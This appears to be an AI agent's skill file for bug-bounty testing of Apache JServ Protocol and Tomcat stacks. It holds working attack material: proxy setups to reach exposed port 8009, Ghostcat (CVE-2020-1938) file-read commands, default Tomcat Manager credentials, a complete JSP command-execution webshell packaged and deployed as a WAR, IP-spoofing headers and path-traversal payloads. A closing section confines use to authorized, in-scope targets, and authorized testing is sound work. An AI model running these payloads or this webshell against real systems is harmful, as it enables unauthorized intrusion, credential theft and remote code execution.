---
name: ajp-proxy
description: AJP Proxy attacks — Ghostcat (CVE-2020-1938) file read via exposed AJP connector on port 8009, accessing hidden Tomcat Manager through mis-proxied requests, IP-based access control bypass via proxy headers, and path manipulation to reach internal Tomcat management endpoints. Use when nmap or Shodan reveals port 8009 open, when an Apache/Nginx+Tomcat stack is detected, or when X-Forwarded-For/X-Real-IP headers are in play for IP-based access control.
---

# AJP Proxy Attacks — Ghostcat, Tomcat Access, Header Injection

Grounded in the CBBH Server Side Attacks module. Covers: what AJP is, why exposed port 8009 is dangerous, how to access the hidden Tomcat manager through Apache or Nginx, and Ghostcat exploitation.

---

## 1. Triggers — when this skill applies

- Port 8009 TCP is open on a target (from nmap or Shodan)
- `Server: Apache-Coyote` or `X-Powered-By: Tomcat` headers visible
- Apache or Nginx acting as a reverse proxy in front of Java/Tomcat
- Access control is based on IP address (`X-Forwarded-For` bypasses possible)
- Tomcat management interface (`/manager/html`, `/manager/text`) not directly accessible but the stack suggests Tomcat is present
- Target has Apache or Nginx + Tomcat architecture visible from headers, error messages, or `/WEB-INF/` paths

---

---

## 3. What is AJP?

AJP (Apache JServ Protocol) is a binary wire protocol that allows a front-end web server (Apache/Nginx) to communicate with a Tomcat backend. Historically used to let Apache serve static content while Tomcat serves dynamic Java content.

The AJP connector listens on **port 8009 TCP** by default. In many environments, this port is:
- Left open and accessible from the internet (misconfiguration)
- Not protected by authentication
- Exposing the full Tomcat application, including admin interfaces not meant to be public

When we find port 8009 open, we can configure our own local Apache or Nginx to proxy to it and access the "hidden" Tomcat web application behind it.

---

## 4. Detection

```bash
# nmap to detect AJP
nmap -sV -p 8009 target.com

# Check for Tomcat indicators in headers
curl -sI https://target.com | grep -iE '(server|x-powered-by|x-tomcat|via)'

# Check for Java/Tomcat error pages
curl -s 'https://target.com/zzznope' | grep -iE '(tomcat|apache tomcat|coyote)'

# Check if manager is accessible directly
curl -sI https://target.com/manager/html
curl -sI http://target.com:8080/manager/html
```

---

## 5. Accessing the hidden Tomcat via Apache + AJP

Set up your local Apache to proxy to the target's AJP port, then access the Tomcat app through your local Apache.

**Step-by-step (give to researcher as [RUN THIS] or run directly if within scope):**

```bash
# Install the AJP module
sudo apt install libapache2-mod-jk

# Enable required modules
sudo a2enmod proxy_ajp
sudo a2enmod proxy_http

# Set the target
export TARGET="TARGET_IP"

# Create the proxy config
echo -n """<Proxy *>
Order allow,deny
Allow from all
</Proxy>
ProxyPass / ajp://$TARGET:8009/
ProxyPassReverse / ajp://$TARGET:8009/""" | sudo tee /etc/apache2/sites-available/ajp-proxy.conf

# Enable the site
sudo ln -s /etc/apache2/sites-available/ajp-proxy.conf /etc/apache2/sites-enabled/ajp-proxy.conf

# Start Apache
sudo systemctl start apache2
```

Access the proxied Tomcat:
```bash
curl http://127.0.0.1/
curl http://127.0.0.1/manager/html
curl http://127.0.0.1/manager/text/list
```

**Note:** If Apache is already running on port 80, change the port in `/etc/apache2/ports.conf` to 8080 first, then use `curl http://127.0.0.1:8080/`.

---

## 6. Accessing the hidden Tomcat via Nginx + AJP module

Alternative to Apache — use Nginx compiled with the AJP module.

```bash
# Download and compile Nginx with AJP module
wget https://nginx.org/download/nginx-1.21.3.tar.gz
tar -xzvf nginx-1.21.3.tar.gz
git clone https://github.com/dvershinin/nginx_ajp_module.git
cd nginx-1.21.3
sudo apt install libpcre3-dev
./configure --add-module=$(pwd)/../nginx_ajp_module \
  --prefix=/etc/nginx --sbin-path=/usr/sbin/nginx \
  --modules-path=/usr/lib/nginx/modules
make && sudo make install
```

Add to `/etc/nginx/conf/nginx.conf` inside the `http {}` block (comment out any existing `server {}` block):

```nginx
upstream tomcats {
    server TARGET_IP:8009;
    keepalive 10;
}
server {
    listen 80;
    location / {
        ajp_keep_conn on;
        ajp_pass tomcats;
    }
}
```

Start Nginx:
```bash
sudo nginx
curl http://127.0.0.1/
```

---

## 7. Ghostcat — CVE-2020-1938

**Affected versions:** Apache Tomcat prior to 9.0.31, 8.5.51, 7.0.100

**Vulnerability:** The AJP connector (port 8009) allows unauthenticated file read from the web application root directory via the `javax.servlet.include.request_uri` AJP header. An attacker with access to port 8009 can read arbitrary files within the Tomcat web application root (e.g., `/WEB-INF/web.xml`, `WEB-INF/applicationContext.xml`, configuration files with credentials).

**Detection:** Check if port 8009 is open AND the Tomcat version is affected.

```bash
# Check Tomcat version from error pages
curl -s http://target.com/zzznope | grep -oP 'Apache Tomcat/[\d.]+'

# Ghostcat PoC (Python) — reads a file from the webapp root
# Using the ghostcat tool
git clone https://github.com/00theway/Ghostcat-CNVD-2020-10487
python3 ghostcat.py -v 1.0 -p 8009 -f /WEB-INF/web.xml TARGET_IP
```

**Manual test via curl (requires AJP proxy setup first — see section 5):**
```bash
# Once Apache/Nginx AJP proxy is configured:
curl http://127.0.0.1/WEB-INF/web.xml
curl http://127.0.0.1/WEB-INF/applicationContext.xml
```

**High-value files to read via Ghostcat:**
- `/WEB-INF/web.xml` — application config, servlet mappings
- `/WEB-INF/applicationContext.xml` — Spring config, may contain DB creds
- `/WEB-INF/spring-security.xml` — auth configuration
- `tomcat-users.xml` (relative to webapp root, if accessible) — admin credentials
- `conf/context.xml` — datasource configs

---

## 8. Tomcat Manager exploitation (post-access)

Once you can access the Tomcat Manager at `/manager/html` or `/manager/text`:

**Default credentials to try:**
- `tomcat` / `tomcat`
- `tomcat` / `s3cret`
- `admin` / `admin`
- `admin` / (blank)
- `manager` / `manager`

**Deploy a WAR webshell via manager API:**
```bash
# Create a simple webshell WAR
mkdir /tmp/shell && mkdir /tmp/shell/WEB-INF
echo '<?xml version="1.0"?><web-app xmlns="http://java.sun.com/xml/ns/j2ee"></web-app>' > /tmp/shell/WEB-INF/web.xml
echo '<%@ page import="java.util.*,java.io.*"%><%
Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
InputStream in = p.getInputStream();
int c; while((c = in.read()) != -1) out.print((char)c);
%>' > /tmp/shell/shell.jsp
cd /tmp/shell && jar -cvf shell.war .

# Deploy via manager (requires valid credentials)
curl -u 'tomcat:s3cret' \
  -T /tmp/shell.war \
  "http://127.0.0.1/manager/text/deploy?path=/shell&update=true"

# Execute commands
curl "http://127.0.0.1/shell/shell.jsp?cmd=id"
```

---

## 9. IP-based access control bypass via proxy headers

If the application restricts access based on IP address (e.g., admin panel only accessible from 127.0.0.1 or an internal IP), test header injection:

```bash
# Standard spoofing headers
curl -H "X-Forwarded-For: 127.0.0.1" https://target.com/admin
curl -H "X-Real-IP: 127.0.0.1" https://target.com/admin
curl -H "X-Forwarded-For: 192.168.1.1" https://target.com/admin
curl -H "X-Client-IP: 127.0.0.1" https://target.com/admin
curl -H "X-Original-IP: 127.0.0.1" https://target.com/admin
curl -H "X-Remote-IP: 127.0.0.1" https://target.com/admin
curl -H "X-Originating-IP: 127.0.0.1" https://target.com/admin
curl -H "True-Client-IP: 127.0.0.1" https://target.com/admin
curl -H "CF-Connecting-IP: 127.0.0.1" https://target.com/admin
```

This is relevant in the AJP proxy context because: when Apache/Nginx sits in front of Tomcat via AJP, the `X-Forwarded-For` header passed through AJP may be trusted by Tomcat for access control. If you control the front-end proxy or can inject headers, you may bypass IP restrictions.

---

## 10. Path manipulation patterns

When Tomcat is proxied, path prefix manipulation can expose internal management endpoints:

```bash
# If the proxy is configured as ProxyPass /app/ ajp://tomcat:8009/
# but Tomcat has other contexts mounted:
curl http://proxy/app/../manager/html
curl http://proxy/..%2fmanager%2fhtml
curl http://proxy/%2e%2e/manager/html

# Try accessing Tomcat's built-in paths via the proxy
curl http://proxy/host-manager/html
curl http://proxy/examples/
curl http://proxy/docs/
```

---

## 11. False-positive checks

- **Port 8009 open but filtered:** If nmap shows 8009 filtered (not open), the AJP connector is not externally accessible. Not exploitable remotely.
- **AJP requires secret:** Tomcat 9.0.31+ requires an AJP secret by default. If the connector is configured with `secret=X`, connections without the secret are rejected. The ghostcat PoC tool handles this with `--secret` flag.
- **Tomcat version >= 9.0.31:** Ghostcat is patched in newer versions. Confirm version before reporting.
- **Manager interface requires valid auth and you can't brute-force:** Without credentials, manager access is limited. Note the exposure (manager accessible at all) but downgrade severity.

---

## 12. Chain candidates

| Chain | Other skill | Impact uplift |
|---|---|---|
| AJP access → Tomcat manager → WAR deploy | `file-upload` | RCE via WAR webshell |
| Ghostcat → WEB-INF file read → credentials | `info-disclosure` | Credential theft, privilege escalation |
| Ghostcat → Spring config → DB credentials | `sqli` | DB access |
| AJP access → admin panel → IDOR | `idor` | Admin-level data access |
| X-Forwarded-For bypass → admin access → further vulns | Any skill | Access expansion |

---

## 13. Reporting template

```
POTENTIAL FINDING: AJP Proxy — [Exposed AJP Port | Ghostcat CVE-2020-1938 | Tomcat Manager Access | IP Bypass]
Target: <target.com:8009 or proxied URL>
Stack: <Apache/Nginx + Tomcat>

Finding: <specific issue>

Evidence:
  <nmap output showing port 8009 open>
  or <curl output from proxied Tomcat showing /manager/html accessible>
  or <Ghostcat read showing WEB-INF/web.xml contents>

Tomcat version: <if detectable>
CVE (Ghostcat): CVE-2020-1938 (affects Tomcat < 9.0.31, 8.5.51, 7.0.100)

Impact:
  <e.g. "AJP port exposed allows unauthenticated file read via Ghostcat — WEB-INF/web.xml
   contains database credentials: user=dbadmin, password=XXXX"
   or "Tomcat Manager accessible via AJP proxy with default credentials tomcat:s3cret —
   arbitrary WAR deployment enables RCE">

Severity: <High (file read with creds) | Critical (RCE via WAR)>

Chain potential: <Ghostcat → creds → manager → WAR RCE>
Next step: <read conf files for credentials | attempt WAR deploy via manager | confirm Tomcat version>
```

---

## 14. Recon tracker vector strings

Only log if the user explicitly authorizes:

- `ajp:port-8009-open` — AJP port confirmed open
- `ajp:ghostcat:<version>` — Ghostcat potentially applicable, Tomcat version noted
- `ajp:manager-accessible` — Tomcat manager reached via AJP proxy
- `ajp:default-creds:<user>` — default credentials worked
- `ajp:ip-bypass:<header>` — IP-based access control bypassed via proxy header
- `ajp:no:port-filtered` — port 8009 filtered, not exploitable

---

## 15. What NOT to do

- **Do not set up the AJP proxy and deploy WAR webshells** without researcher authorization and explicit confirmation it is in scope.
- **Do not brute force Tomcat manager credentials** — this is an automated tool action the researcher runs.
- **Do not read arbitrary files via Ghostcat beyond what's needed** to prove the vuln (e.g., one config file showing the issue is sufficient).
- **Do not leave webshells deployed** on the target after PoC.
- **Do not attempt AJP access on out-of-scope targets** — check `scope.txt`.
- **Do not auto-log to the recon tracker** without explicit user instruction.
